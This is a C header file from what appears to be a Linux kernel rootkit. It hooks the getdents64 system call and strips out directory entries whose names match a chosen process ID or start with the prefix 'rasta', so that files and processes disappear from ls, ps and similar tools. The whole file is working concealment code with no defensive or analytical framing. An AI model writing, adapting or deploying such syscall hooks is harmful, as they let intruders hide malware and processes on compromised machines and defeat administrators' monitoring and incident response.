#ifndef _GETDENTS64_H_
#define _GETDENTS64_H_

#define PREFIX "rasta"

char hide_pid[NAME_MAX];

static asmlinkage long (*og_getdents64)(const struct pt_regs *);

static asmlinkage int hooked_getdents64(const struct pt_regs *regs);

static notrace asmlinkage int hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = og_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        // Hide entries matching the PID (if hide_pid is set)
        if (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0)
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        // Hide entries starting with the prefix
        else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

#endif
